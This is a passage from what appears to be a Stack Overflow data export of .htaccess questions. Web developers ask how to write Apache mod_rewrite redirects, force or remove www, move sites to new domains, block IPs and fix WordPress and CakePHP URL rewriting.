[R=301,L]\n</code></pre>\n"},{"tags":[".htaccess","variables","redirect","get"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13014616,"title":".htaccess redirect, change GET variables","body":"<p>Very simple question. I need to change url like</p>\n\n<pre><code>http://www.mysite.com/index.php?page=[x]\n</code></pre>\n\n<p>where [x] is any number to</p>\n\n<pre><code>http://www.mysite.com/index.php?id=[x]\n</code></pre>\n\n<p>Just to change ?page= to ?id= using .htaccess 301 redirect.</p>\n\n<p>How can I do this?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12964528,"title":"mod_rewrite: remove www and redirect into folder if not already in URL","body":"<p>First time here, and I'm a bit of a mod_rewrite and regex noob, so please let me know if I've missed anything. I've searched here and elsewhere all day but not found exactly what I need.</p>\n\n<p>I'm looking for a set of RewriteConds and RewriteRules that will accomplish the following:</p>\n\n<ul>\n<li>remove the www, if present in URL</li>\n<li>redirect into a folder, if not already present in URL</li>\n<li>preserve the rest of the URL</li>\n</ul>\n\n<p>I have a web app installed in a specific subfolder (we'll call it /webapp) which is configured to <strong>require</strong> no www on the url. It presents a stupid annoying message to the user if they include the www. I can dig into the app and reprogram that, but I'd like to handle that for the users through .htaccess and mod_rewrite, and simultaneously dump them into the folder, if they forget to type it, doing all of this with a 301 redirect.</p>\n\n<p>For example, I'd like any of the following requests</p>\n\n<pre><code>http://www.mydomain.org/webapp/anything\nhttp://www.mydomain.org/anything\nhttp://mydomain.org/anything\n</code></pre>\n\n<p>To be redirected to</p>\n\n<pre><code>http://mydomain.org/webapp/anything\n</code></pre>\n\n<p>And obviously if a \"correct\" URL (one starting with <code>http://mydomain.org/webapp/</code>) is requested, it's not rewritten at all.</p>\n\n<p>My best guess so far is as follows:</p>\n\n<pre><code>RewriteEngine on\n\nRewriteCond %{HTTP_HOST} ^www\\.mydomain\\.org$ [NC]\nRewriteRule ^(.*)$ http://mydomain.org/$1 [R=302]\n\nRewriteCond %{REQUEST_URI} !^/webapp.*$ [NC]\nRewriteRule ^(.*)$ http://mydomain.org/webapp/$1 [R=302]\n</code></pre>\n\n<p>This seemed to work according to <a href=\"http://htaccess.madewithlove.be/\" rel=\"nofollow\">http://htaccess.madewithlove.be/</a> but in practice, not so much.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13012899,"title":"How to tell htaccess / apache rewrite to ignore certain URL","body":"<p>I am currently using a htaccess file as follows to redirect non-www to www domain and to hide ugly get parameters.</p>\n\n<pre><code>RewriteEngine On\n\nRewriteCond %{HTTP_HOST} !^www\\.\nRewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([^/]+)/([^/]+)/? /index.php?s=$1&amp;p=$2 [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([^/]+)/? /index.php?s=$1 [L]\n</code></pre>\n\n<p>I want to install a package in a subdirectory (ie. www.mydomain.com/software/) but at the moment the rewrite is picking that up and causing an error with too many redirects (cyclical redirects).</p>\n\n<p>How can I achieve that?</p>\n\n<p>www.mydomain.com/package should go to that directory to be handled rather than rewrite trying to do stuff</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13012154,"title":"htaccess redirect for sub dmoain and folder files","body":"<p>so we had a development site up for example: test.domain.com/dev/filename.html and its been indexed by Google so i need to redirect them to www.newdomain.com/filename.html but not just files but also folders/files like.</p>\n\n<p>test.domain.com/dev/example/filename.html </p>\n\n<p>or\nwww.newdomain.com/example/example/filename.html</p>\n\n<p>to</p>\n\n<p>www.newdomain.com/filename.html</p>\n\n<p>note that the /dev/ folder on test domain cannot be pushed on the redirect?</p>\n\n<p>Anyone  have any ideas on this?</p>\n\n<p>i have tried:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{HTTP_HOST} !test.domain.co.uk/dev/$ [NC]\nRewriteRule ^(.*)$ http://www.newdomain.com/$1 [L,R=301]\n</code></pre>\n\n<p>after some tests this redirects to <a href=\"http://www.newdomain.com/dev/page.html\" rel=\"nofollow\">http://www.newdomain.com/dev/page.html</a> and i need to remove the /dev/ .....</p>\n\n<p>and some other options while hunting around but nothing yet meet the requirement.</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect","seo"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":49,"score":2,"question_id":13001173,"title":".htaccess 301 redirect from old domain to new domain while structure of pages and url are same","body":"<p>I want to redirect <a href=\"http://olddomain.com\" rel=\"nofollow\">http://olddomain.com</a> to  <a href=\"http://newdomain.com\" rel=\"nofollow\">http://newdomain.com</a> for my all urls..keeping the page on new domain same.\nWhat i mean to say is URLs such as below</p>\n\n<pre><code>http://olddomain.com/home/category/page.html\nhttp://olddomain.com/home/mybook/page2.html\nhttp://olddomain.com/login\n\nshould be 301 redirect to the new newdomain but same pages, like below\n\nhttp://newdomain.com/home/category/page.html\nhttp://newdomain.com/home/mybook/page2.html\nhttp://newdomain.com/login\n</code></pre>\n\n<p>this is what  i have in my .htaccess currently</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php|img|public|robots\\.txt) [NC]\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n</code></pre>\n\n<p>Please help me to do this cleanly and exlpain things in details since i am new in this. </p>\n\n<p>also does someone know how much time search engines might take to move away from the references of my olddomain? i mean the old-domain urls in search queries should be replaced by new-domain urls... n old domain should go away from search engines.</p>\n"},{"tags":["php",".htaccess","dynamic","getimagesize"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13011465,"title":"getimagesize on dynamic image","body":"<p>I have a MySQL table in which I store user avatars as a blob. I fetch those images with a script called avatar.php which outputs the image. To request a specific user image, you have to call avatar.php?id=(user id). To make the dynamic image name pretty, I added an URL rewrite in my .htaccess so you can also call avatar-(userid).jpg, which will translate in avatar.php?id=(userid).</p>\n\n<p>Now I want to fetch the user image and manipulate it using GD. I tried using getimagesize() and imagecreatefromjpeg() but I'm continuously getting an \"failed to open stream no such file or directory\" error.. Both the script in which I try to use these functions, as the avatar.php script, are in the root directory. I tried:</p>\n\n<pre><code>getimagesize('avatar.php?id=1');\ngetimagesize('./avatar.php?id=1');\ngetimagesize('/avatar.php?id=1');\n...and the same but using avatar-1.jpg instead.\n</code></pre>\n\n<p>When I use the full url of my site (including http:// etc.) it actually works... But I haven't found out why.</p>\n\n<p>//<strong>Edit</strong>:\nSimilar problem occurs when using the file_exists() function. If I try file_exists('./avatar.php') it returns true, if I add get-vars it returns false. Are these functions unsuitable for dynamic files?</p>\n\n<p>Could someone help me out please?</p>\n\n<p>Thanks in advance</p>\n"},{"tags":[".htaccess","web","hacking"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12335634,"title":"My .htaccess is changed over and over and over","body":"<p>I hope you can help me, I have a website and constantly the .htaccess file is hacked to redirect to another page, every time I delete that file, when I check the file after 5 minutes, again the file is written to redirect to a page with malware, I changed passwords of sftp, the page itself and the database several times from different computers with windows and linux but this file is constantly changed in the main page and creating hacked .htaccess in the subdirectories, Why does this keep happening? HELP</p>\n\n<p>The web page is hosted in Dreamhost.</p>\n"},{"tags":["facebook",".htaccess","facebook-php-sdk"],"answer_count":5,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":5260,"score":4,"question_id":7340764,"title":"Problem with Facebook login not matching CSRF state token","body":"<p>I did some searches and I didn't find anything that was related to my problem.</p>\n\n<p>I'm currently trying to implement a Facebook login to my website and I'm having problems with the login authentication due to htaccess mod rewrite URLs?</p>\n\n<p>The code works perfectly and I get logged in if I use it without the mod rewrite rules like:</p>\n\n<pre><code>domain.com/view_webhosting.php?webhosting=name\n</code></pre>\n\n<p>But as soon as I go over to the mod rewrite URL </p>\n\n<pre><code>domain.com/webhosting-name/\n</code></pre>\n\n<p>Then it just doesnt work and throws a error \"CSRF state token does not match one provided.\"</p>\n\n<p>in the htaccess file it looks like this</p>\n\n<pre><code>RewriteRule ^webhosting-([a-z_0-9-]+)/$ /view_webhosting.php?webhosting=$1 [L]\n</code></pre>\n\n<p>Anyone have a solution to a problem like this? I am using Facebook SDK v3.1.1</p>\n"},{"tags":["php","mysql",".htaccess"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":55,"score":-2,"question_id":13010170,"title":"Force URL lowercase PHP/htaccess","body":"<p>I have the following that I'd like to make all lowercase...</p>\n\n<pre><code>echo '&lt;a href=\"/people/' . $row[\"Location_County\"] . '/' . $row[\"First_Name\"] . '-' . $row[\"Surname\"] . '/' . $row[\"ID\"] . '\"&gt;View Profile&lt;/a&gt;';\n</code></pre>\n\n<p>Each county is capitalised as well as their names, is their a way I can force this all lowercase? Is it poeeible to do it with htaccess or can I do this using PHP? </p>\n"},{"tags":["php","apache",".htaccess","routing"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13007656,"title":"General htaccess for .dev TLD & localhost/example with PHP routing","body":"<p>I've recently setup an .dev TLD for my development work here on my local machine. But have always worked with localhost/example for my development. Because I use \"http://my.ip/example\" to show and test work on different machines, I would love to still keep have that working properly.</p>\n\n<p>Now I've ran into the following problem: </p>\n\n<p>example.dev points to localhost/example, which works fine. Although I seem to need 1 difference in my htaccess to have it working alright.</p>\n\n<pre><code>RewriteRule ^(.+)$ /index.php/$1 [L,QSA]\n</code></pre>\n\n<p>Works for the .dev TLD. While</p>\n\n<pre><code>RewriteRule ^(.+)$ index.php/$1 [L,QSA]\n</code></pre>\n\n<p>(Notice the missing slash before index.php) is required to keep it working on localhost/example (because the prepended / makes it look in localhost).</p>\n\n<p>Does anyone have any idea on how I could make my .htaccess or script general enough that it would work in both cases?</p>\n\n<p><strong>Update</strong>: Full htaccess</p>\n\n<pre><code>Options +FollowSymLinks\nIndexIgnore */*\n\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.+)$ /index.php/$1 [L,QSA]\n</code></pre>\n\n<p><strong>UPDATE 2</strong>: Error log from Apache.</p>\n\n<pre><code>[Mon Oct 22 12:50:46 2012] [error] [client 127.0.0.1] Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary.\n</code></pre>\n"},{"tags":[".htaccess","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13009360,"title":"rename part of a url with .htaccess","body":"<p>I know very little coding and have done some research on this, but nothing has worked with my cut &amp; paste tactic. Any help would be much appreciated.</p>\n\n<p>I have changed my site and now need to redirect old urls as follows:\nold url - www.mydomain/directory/furniture-design/listing-name/view-details.html\nnew url - www.mydomain/designers/furniture/listing-name.html</p>\n\n<p>So far I have \nRedirectMatch 301 /directory/(.*)$    <a href=\"http://www.find-design.co.za/designers.html\" rel=\"nofollow\">http://www.find-design.co.za/designers.html</a>\n,but I need to load the actual page</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13009374,"title":"htaccess issue not working properly","body":"<p>I am using URL Rewriting in .htaccess file my problem is this in root folder I have index.php file and I am redirect to <code>en/home/</code> folder but redirection is not working when I use this .htaccess code.</p>\n\n<pre><code>RewriteRule ^([^/]*+)$ en/peoples/globalCardDetail.php?p=$1\n</code></pre>\n\n<p>Rewriting is working fine like this <code>http://www.domain.com/atiq ur rehman</code>. But when I access my domain <code>http://www.domain.com</code> this is redirecting to this page <code>en/peoples/globalCardDetail.php</code>.</p>\n"},{"tags":[".htaccess","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13009138,"title":"htaccess dash in rewrite causing issues","body":"<p>I cant seem to get my htaccess code right for redirecting pages that appear like the below to go to a 410 page, eg:</p>\n\n<pre><code>www.domain.com/-c-23.html\nwww.domain.com/-c-12.html\nwww.domain.com/-c-755.html\n</code></pre>\n\n<p>Basically, I want a rule whereby anything where \"-c-\" comes directly after the slash of the domain gets sent to a 410. I have been trying to do this but my code isn't working, so far I have something like this:</p>\n\n<pre><code>RewriteRule ^/\\-c-[0-9]+\\.html$ - [G]\n</code></pre>\n\n<p>But this makes no difference at all, any idea why this is not working?</p>\n"},{"tags":[".htaccess","caching","expires"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13009272,"title":"EXPIRES CACHING - When I make a change on the site - you have to do refresh the page to see the change ...!","body":"<p>I got EXPIRES CACHING - file. Htaccess file to my site.\nThe problem is:\nWhen I make a change to a particular page on the site - you have to do refresh the page to see the change ...!</p>\n\n<p>If I give the code (instead of one year) 8 days - that means there will not be need to refresh the page to view the change?</p>\n\n<p>Or is there another solution to this problem?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13008345,"title":".htaccess redirect all pages to same page on new server","body":"<p>I am moving hosts and i have been advised to set up a redirect whilst the DNS changes are being progressed. The site structure on my new server is identical to my current server so all i need is the base url changed. E.g.</p>\n\n<p><a href=\"http://www.mysite.com/Category1\" rel=\"nofollow\">http://www.mysite.com/Category1</a></p>\n\n<p>Will redirect to:</p>\n\n<p>http://[my new ip address]/Category1</p>\n\n<p>Help is really appreciated</p>\n\n<p>Thanks</p>\n\n<p>Paul</p>\n"},{"tags":[".htaccess","ip","text-files","block"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":13008242,"title":"Ban IPs from text file using htaccess","body":"<p>I read and understand how to block an ip using htaccess:</p>\n\n<pre><code>order deny,allow\ndeny from 111.222.33.44\ndeny from 55.66.77.88\n...\nallow from all\n</code></pre>\n\n<p>But my list of black IPs includes thousands of IPs.\nI save all IPs to blacklist.txt file.\nCan I use htaccess to call blacklist.txt and block all IPs which stored in blacklist.txt\nAnd how to?</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess","query-string"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12770808,"title":"htaccess redirect from domain.com/index.php?page=about to domain.com/about","body":"<p>I've upgraded an old website and wanted to redirect all the old pages to the new ones. the old website used the index page and a query string to server the relevant content.</p>\n\n<p>here is the new htaccess file. the problem in question is getting the redirect to work. also if you can steamline this file:</p>\n\n<pre><code>Options +FollowSymLinks\nOptions +Indexes\nRewriteEngine on\nRewriteBase /\n\nRewriteCond %{HTTP_HOST} ^www.domain.co.uk$ [NC]\nRewriteRule ^(.*)$ http://domain.co.uk/$1 [R=301,L]\n\n#if its not a directory\nRewriteCond %{REQUEST_FILENAME} !-d\n#and it has a trailing slash then redirect to URL without slash\nRewriteRule ^(.+)/$ /$1 [L,R=301]\n\n#this removes php extention\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^([^\\.]+)$ $1.php [NC,L] \n\n# stops you accessing url with.php\nRewriteCond %{THE_REQUEST} ^[A-Z]+\\ /([^.?\\ ]+)\\.php\nRewriteRule ^([^.]+)\\.php(/.+)?$ /$1%{PATH_INFO} [R=301]\n\nRewriteRule ^news/([^/]*)/([^/]*)$ /news?id=$1&amp;title=$2 [L]\n\nRedirect 301 index?page=about http://domain.co.uk/about\n\nErrorDocument 404 http://domain.co.uk/404\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13007938,"title":".htaccess convert a url parameter in folders","body":"<p>I try to convert a url parameter in folders using RewriteRule.\nAnyone can help me?.</p>\n\n<p><strong>Origin:</strong> search.php?term=red&amp;cat=colors\n<strong>Destination:</strong> /search/red/colors</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13008402,"title":"htaccess, url must have the www in it or re-direct","body":"<p>I need to re-direct a url of a website of mine, if it hasn't the www in it, because of a script that dont work if the url isn't complete, how can i do this with a htacces file, I cant find an example on the web.</p>\n"},{"tags":["wordpress",".htaccess","permalink"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12951357,"title":"Wordpress permalink structure change issue","body":"<p>I have seen some other posts on SO about this issue, however none of the suggested solutions did work for me, so I repost.</p>\n\n<p>After changing my permalink structure to <code>/%postname%/</code>, none of the links is working. I get the following 404:</p>\n\n<pre><code>Not Found\n\nThe requested URL /my-post-name/ was not found on this server.\n\nApache/2.2.20 (Ubuntu) Server at mysite.com Port 80\n</code></pre>\n\n<p>When I get back to the <code>default</code> permalink structure it starts to work again, but I want to have <code>/%postname%/</code> structure anyways.</p>\n\n<p>My <code>.htaccess</code> file's <code>chmod</code> is 777.</p>\n\n<p>After updating my permalink structure to <code>/%postname%/</code>, the <code>.htaccess</code> file generated by Wordpress is the following:</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n# END WordPress\n</code></pre>\n\n<p>Any thoughts?</p>\n\n<h2>Edit:</h2>\n\n<p>I tried to change permalink structure to the following:</p>\n\n<pre><code>/index.php/%postname%/\n</code></pre>\n\n<p>and it happily worked. However, the problem is now, not surprisingly, the links are in the following form:</p>\n\n<pre><code>www.mysite.com/index.php/my-page.com\n</code></pre>\n\n<p>My question is how can I remove <code>index.php</code> from my links. When I remove it from the permalink structure (i.e., <code>/%postname%/</code>), my links no longer work.</p>\n\n<p>PS: Instead of using blog entries I use only pages in my site. If it is necessary my site is: mll.sehir.edu.tr.</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect","http-status-code-301"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13007511,"title":".htacces redirect with exception","body":"<p>I have a problem with an redirect exception.\nAll the files in root were redirected to /\nI want create a exception for the sitemap.xml.</p>\n\n<p>My htaccess :</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^www.website.com$\nRewriteCond %{REQUEST_URI} ^/$\nRewriteCond %{REQUEST_URI} !sitemap.xml$\nRewriteRule ^(.*)$       site/web/website/index.php [L]\n\nRewriteCond %{HTTP_HOST} ^www.website.com$\nRewriteCond %{REQUEST_URI} ^/site/web/website/$\nRewriteCond %{REQUEST_URI} !sitemap.xml$\nRewriteRule .* http://www.website.com/ [R=301,L]\n\nRewriteCond %{HTTP_HOST} ^website.com$\nRewriteCond %{REQUEST_URI} ^/site/web/website/$\nRewriteRule .* http://www.website.com/ [R=301,L]\n</code></pre>\n\n<p>But does not work :(.</p>\n\n<p>Many thanks</p>\n"},{"tags":[".htaccess","google","search","dreamweaver","sitemap"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":12959768,"title":"How can I exclude pages no longer in my sitemap from being indexed in Google?","body":"<p>I've taken over management of a site that has hundreds of pages that are no longer active in the sitemap, but which are indexed by Google. Many of these lead to products and services we no longer offer. This normally wouldn't be big bother to me, but there are lots of problems on these pages that are affecting our SEO, and I'd rather just focus on the pages that are supposed to be live rather than performing SEO on pages that no one is meant to see. While I could go through and delete these, that makes me nervous. I'd prefer to have a record of all previous pages, preferably in the directory in which they existed. Is there a way to have Google only index pages that are part of the current, active sitemap structure, without having to go one-by-one and remove them all from their various directories throughout the site?</p>\n\n<p>Any pointers would be much appreciated!</p>\n"},{"tags":["regex","apache",".htaccess","redirect","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13005629,"title":"htaccess non existing subdomain to main domain redirection","body":"<p>Need to know if this possible or not? If yes then how?</p>\n\n<p>Main Domain is: <code>abc.com</code>; Subdomain is: <code>sub.abc.com</code></p>\n\n<p>I want to redirect everything like <code>[alphanumeric].abc.com</code> to <code>abc.com</code> except the sub domain (<code>sub.abc.com</code>).</p>\n\n<p>e.g. <code>ajf43vsfvsuvfsg.abc.com</code> to <code>abc.com</code>; \"ajfvsfvsuvfsg\" doesn't exist.</p>\n"},{"tags":[".htaccess","ssl","shared-hosting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13005198,"title":"shared ssl 404 w/ existing htaccess - follow-up to /questions/12737308/","body":"<p>I hope asking a new question is the right approach to follow-up to an existing question(?) - please bear with me if not, I'm pretty much new to stackoverflow. That said, I'm referring to <a href=\"http://stackoverflow.com/questions/12737308/hide-html-extension-redirect-html-version-special-case-exception\">hide html extension + redirect .html version + special case exception</a></p>\n\n<p>The htaccess provided by user Jon Lin works perfectly fine so far, but now I'm struggling with a related problem (I think it's related to the htaccess) and that is to use a shared ssl certificate for just one specific page on our site, let's call it baz.html</p>\n\n<p>Due to the existing/cited htaccess, hxxp://mydomain.com/baz.html resolves to hxxp://mydomain.com/baz, which is fine. But, trying to use a shared ssl at hxxps://shared.host.com/~user/baz(.html) leads to a 404 not found error. I'm pretty sure (I assume so) that this is due to the used htaccess as the shared ssl tutorial provided by our host is pretty much unmistakeable.</p>\n\n<p>Also, the document root (foo.html) shows up (as the only not-404) when accessing it with shared ssl but the CSS(+images), although relatively linked within the html code, isn't processed. I assume(?) this is related.</p>\n\n<p>Basically, what I'd like to achieve is linking hxxps://shared.host.com/~user/baz instead of hxxp://mydomain.com/baz within our main site navigation to achieve a secured page (same as I do now for foo(.html), bar(.html), just for unsecured content)</p>\n\n<p>I hope that my actual problem is perfectly understandable(?). I do not want to link our actual project page to not do self-advertising of some sort. If access to the actual page is needed to answer the question I'll certainly provide a link (if explicitly asked for)</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":[".htaccess","ubuntu","amazon-ec2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13005931,"title":"rewriting to always use www in domain ( even on subpages )","body":"<p>I've added the following to my .htaccess to properly redirect any visitors from <a href=\"http://domain.com\" rel=\"nofollow\">http://domain.com</a> to <a href=\"http://www.domain.com\" rel=\"nofollow\">http://www.domain.com</a> ... but I still can't get it to work with subpages...ie <a href=\"http://domain.com/subpage\" rel=\"nofollow\">http://domain.com/subpage</a> is not yet redirecting to <a href=\"http://www.domain.com/subpage\" rel=\"nofollow\">http://www.domain.com/subpage</a> . </p>\n\n<p>Here is what I have in my htaccess now: </p>\n\n<pre><code>&lt;Files wp-config.php&gt;\norder allow,deny\ndeny from all\n&lt;/Files&gt;\n\n&lt;Files .htaccess&gt;\norder allow,deny\ndeny from all\n&lt;/Files&gt;\n\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n\nRewriteCond %{HTTP_HOST} !^www\nRewriteRule (.*) http://www.%{HTTP_HOST}/$1 [L,R]\n\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>So the question is what else would I need to add or update in my htaccess to get this working? </p>\n\n<p>Many thanks for your suggestions! </p>\n"},{"tags":["regex",".htaccess","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13005582,"title":"HTAccess and Regex... Exclude String?","body":"<p>I am using htaccess to rewrite my URL's... with codeigniter, to be specific.  I Have two applications, one called \"frontend\", the other called \"admincp\".  The front end application uses index.php with $application_folder changed to \"frontend\".  The admincp application uses a copied index.php,  but renamed to admin.php.  The $application_folder is changed to \"admincp\" in this file.</p>\n\n<p>Basically, I want all URi's that contain \"admincp\" as the first uri segment to be rewritten to the admin.php file instead of index.php.  Then, all other URL's to be rewritten as usual... to index.php.</p>\n\n<p>mysite.com/admin/members would go to admin.php/members\nmysite.com/articles/Some-Awesome-Articles would go to index.php/articles</p>\n\n<p>I hope I have explained this well enough... Anyway, here is my current htaccess file, but it doesn't seem to work.  I get an internal server error.</p>\n\n<p><code></p>\n\n<pre><code> # Deny OR Allow Folder Indexes.\n# Since we disable access to PHP files you \n# can leave this on without worries. \n# OR better yet, create a .htaccess file in\n# the dir you want to allow browsing and\n# set it to +Indexes\nOptions -Indexes\n\nOptions +FollowSymLinks\n\n# Set the default file for indexes\nDirectoryIndex index.php\n\n&lt;IfModule mod_rewrite.c&gt;\n    # mod_rewrite rules\n    RewriteEngine on\n\n    # The RewriteBase of the system (if you are using this sytem in a sub-folder).\n    # RewriteBase /CodeIgniter_1.6.3/\n\n    # This will make the site only accessible without the \"www.\" \n    # (which will keep the subdomain-sensive config file happy)\n    # If you want the site to be accessed WITH the \"www.\" \n    # comment-out the following two lines.\n    # RewriteCond %{HTTP_HOST} ^www\\.site\\.com$ [NC]\n    # RewriteRule ^(.*)$ http://site.com/$1 [L,R=301]\n\n    # If a controler can't be found - then issue a 404 error from PHP\n    # Error messages (via the \"error\" plugin)\n    # ErrorDocument 403 /index.php/403/\n    # ErrorDocument 404 /index.php/404/\n    # ErrorDocument 500 /index.php/500/\n\n    # Deny any people (or bots) from the following sites: (to stop spam comments)\n    # RewriteCond %{HTTP_REFERER} nienschanz\\.ru [NC,OR]\n    # RewriteCond %{HTTP_REFERER} porn\\.com\n    # RewriteRule .* - [F]\n    # Note: if you are having trouble from a certain URL just \n    # add it above to forbide all visitors from that site.\n\n    # You can also uncomment this if you know the IP:\n    # Deny from 192.168.1.1\n\n    # If the file is NOT the index.php file\n    RewriteCond %{REQUEST_FILENAME} !index.php\n    # Hide all PHP files so none can be accessed by HTTP\n    RewriteRule (.*)\\.php$ index.php/$1\n\n    # If the file/dir is NOT real go to index\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^admin/(.*)$ admin.php/$1\n    RewriteRule ^(.*)$ index.php/$1\n\n&lt;/IfModule&gt;\n\n# If Mod_ewrite is NOT installed go to index.php\n&lt;IfModule !mod_rewrite.c&gt;\n    ErrorDocument 404 index.php\n&lt;/IfModule&gt;  \n</code></pre>\n\n<p></code></p>\n"},{"tags":[".htaccess","redirect","http-status-code-301"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13003561,"title":"htaccess 301 redirect old page to new page dynamicly","body":"<p>i've changed my addresses and made them sef, but some of my links were old and some of them were shared by people, if they would try to enter there, they will see 500 internal server error, as you can imagine, i need to redirect them to new url, i know how to redirect staticly, but don't know how to with dynamicly</p>\n\n<p>for instance, my old link was : mywebsite.com/profile/1, my new link is mywebsite.com/profile/1/johnny-walker</p>\n\n<p>if someone tries to look to my old link, i want them to redirect to my new link</p>\n\n<p>my old rule was:</p>\n\n<pre><code>RewriteRule ^profile/(.*)/?$ profile.php?id=$1 [L] \n</code></pre>\n\n<p>my new rule is : </p>\n\n<pre><code>RewriteRule ^profile/([0-9]*)/(.*)/?$  profile.php?id=$1&amp;slug=$2 [QSA,L]\n</code></pre>\n\n<p>thank you</p>\n"},{"tags":["apache",".htaccess","cakephp","mod-rewrite","cakephp-2.0"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2649,"score":2,"question_id":8314708,"title":"CakePHP 2.0.4 \"URL rewriting is not properly configured on your server\"","body":"<p>I've been trying to setup CakePHP on a development section of my server and I can't seem to solve the \"URL rewriting is not properly configured on your server\" error. I suspect I'm not configuring the .htaccess files with the correct RewriteBase. I've tried a wide variety of different RewriteBase for each file, but I can't seem to hit the right ones, and Cake doesn't give me any information other than \"not working\" (URL rewrite errors don't end up in Cake's error log).</p>\n\n<p>I do not have access to my httpd.conf file, but I've used .htaccess and mod_rewrite with other frameworks (Wordpress and CodeIgniter) without a problem.</p>\n\n<p>My base url for the site is: <a href=\"http://dev.domain.com/cake/\" rel=\"nofollow\">http://dev.domain.com/cake/</a></p>\n\n<p>My base server path is: /home/username/public_html/dev/cake/</p>\n\n<p>Cake root .htaccess:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /cake\n    RewriteRule    ^$ app/webroot/    [L]\n    RewriteRule    (.*) app/webroot/$1 [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Cake app directory .htaccess:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /cake/app\n    RewriteRule    ^$    webroot/    [L]\n    RewriteRule    (.*) webroot/$1    [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Cake webroot directory .htaccess:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase 